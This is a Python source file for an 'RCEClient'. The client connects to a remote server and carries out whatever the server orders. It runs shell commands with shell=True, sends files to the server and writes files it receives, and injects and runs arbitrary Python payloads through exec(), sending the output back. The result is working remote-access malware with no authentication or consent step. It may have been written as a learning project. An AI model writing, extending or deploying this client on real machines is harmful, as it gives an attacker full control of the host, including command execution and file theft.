import os
import subprocess
import sys
import traceback
from pathlib import Path

from src.core.base_client import BaseClientThread
from src.core.exception import MessageTypeError, FileWriteError, FileReadError
from src.core.logger import Logger
from src.core.message import MessageType, Message


class RCEClient(BaseClientThread):
    """
    A client thread that connects to a remote server and performs actions based on incoming messages from the server.
    """

    def __init__(self, host='localhost', port=6000, debug=False):
        super().__init__()
        self.cwd = Path.cwd()
        self.__logger = Logger(self.__class__.__name__, debug)
        try:
            self.connect_to_server(host, port)
            self.__logger.on_info(f"Connected to {host}:{port}")
        except ConnectionRefusedError as e:
            self.__logger.on_error(f"Failed to connect to {host}:{port}")
            self.__logger.on_debug(f"[REASON] {e}")
            exit(1)

    def run(self):
        """
        Runs the client thread which handles incoming messages from the server and performs actions based on the
        message type.
        """
        self.__logger.on_info("Listening for messages...")
        while self.is_connected():
            try:
                message = self.receive_message()
                if message.is_type(MessageType.DISCONNECT):
                    raise OSError("RECEIVED DISCONNECT")

                if message.is_type(MessageType.ECHO):
                    self.__logger.on_info(message.data.decode())
                    self.send_message(message)
                elif message.is_type(MessageType.CMD):
                    self.__logger.on_debug(f"Executing command:\n\t{message}")
                    self.execute_command(message)
                elif message.is_type(MessageType.FILE_UPLOAD):
                    self.__logger.on_debug("Receiving file...")
                    file_path = Path(message.data.decode())
                    self.receive_file(file_path.name, file_path.parent)
                    self.__logger.on_info(f"File '{file_path}' received")
                elif message.is_type(MessageType.FILE_DOWNLOAD):
                    self.__logger.on_debug("Sending file...")
                    filename = message.data.decode()
                    self.send_file(filename)
                    self.__logger.on_debug(f"File '{filename}' sent")
                elif message.is_type(MessageType.INJECT):
                    self.__logger.on_debug(f"injecting:\n\t{message}")
                    self.inject_payload(message)
                elif message.is_type(MessageType.EXECUTE):
                    self.__logger.on_debug(f"executing:\n\t{message}")
                    self.execute_payload()
                elif message.is_type(MessageType.ERROR):
                    self.__logger.on_debug(f"error:\n\t{message}")
                else:
                    self.__logger.on_debug(f"Unknown message type: {message.get_type()}")
            except (FileNotFoundError, MessageTypeError, FileWriteError, FileReadError) as e:
                self.__logger.on_error(e)
                self.send_message(Message(message_type=MessageType.ERROR, data=traceback.format_exc().encode()))
            except OSError as e:
                self.close()
                self.__logger.on_error("DISCONNECTED from server")
                self.__logger.on_debug(f"[REASON] {e}")
                break

    # noinspection PyMethodMayBeStatic
    def payload(self):
        """
        This is where the payload is defined and will be dynamically injected and executed by the server.
        """
        return "No payload has been injected"

    def inject_payload(self, message: Message):
        """
        Injects the payload from the received message.

        The payload is:
          - Decoded from the message data.
          - Executed using the built-in exec() function with local and global scope.
          - Assigned as an attribute of the RCEClient class.

        :param message: The message containing the payload to be injected.
        """
        received_payload = message.data
        self.__logger.on_debug("Injecting payload:\n" + received_payload.decode())
        try:
            exec(received_payload, locals(), globals())
            setattr(RCEClient, "payload", getattr(sys.modules[__name__], "payload"))
            self.__logger.on_debug("Injected payload")
            self.send_message(Message(message_type=MessageType.ECHO, data=b"Payload injected"))
        except AttributeError as e:
            self.__logger.on_error(e)
            self.send_message(Message(MessageType.ERROR, traceback.format_exc().encode()))
        except OSError:
            self.__logger.on_error("Connection closed by peer")

    def execute_payload(self):
        """
        Executes the payload and sends its output back to the server.
        :raises: OSError: If an error occurs while sending the output back to the server.
        """
        # noinspection PyBroadException
        try:
            if not (output := self.payload()):
                return

            output = str(output)
            self.__logger.on_debug(f"Output from payload execution:\n{output}")
            self.send_message(
                Message(message_type=MessageType.ECHO, data=output.encode()))
        except OSError:
            self.__logger.on_error("Connection closed by peer")
        except Exception:
            self.__logger.on_debug(traceback.format_exc())
            self.send_message(
                Message(message_type=MessageType.ERROR, data=traceback.format_exc().encode()))

    def execute_command(self, message: Message):
        """
        Executes the shell command and sends its output back to the server.
        :param message: The message containing the command to be executed.
        :raises: OSError: If an error occurs while sending the output back to the server.
        """
        # noinspection PyBroadException
        try:
            if message.data.decode().startswith("cd"):
                working_dir = message.data.decode().removeprefix("cd").strip()
                working_dir = Path.home() if working_dir in ["", "~"] else working_dir

                if not os.path.exists(working_dir):
                    err = f"{working_dir} does not exist"
                    self.__logger.on_error(err)
                    self.send_message(Message(message_type=MessageType.ERROR, data=err.encode()))
                    return

                os.chdir(working_dir)
                self.cwd = Path.cwd().absolute()

                success_msg = f"Changed directory to {self.cwd}"
                self.__logger.on_debug(success_msg)
                self.send_message(Message(message_type=MessageType.ECHO, data=success_msg.encode()))
            else:
                cmd = subprocess.run(message.data.decode(), stdout=subprocess.PIPE, shell=True)
                if not (output := cmd.stdout.decode()):
                    return

                output = "\n" + output
                self.__logger.on_debug(f"Output from command execution:\n{output}")
                self.send_message(Message(message_type=MessageType.ECHO, data=output.encode()))
        except OSError:
            self.__logger.on_error("Connection closed by peer")
        except Exception:
            self.__logger.on_error(traceback.format_exc())
            self.send_message(Message(message_type=MessageType.ERROR, data=traceback.format_exc().encode()))
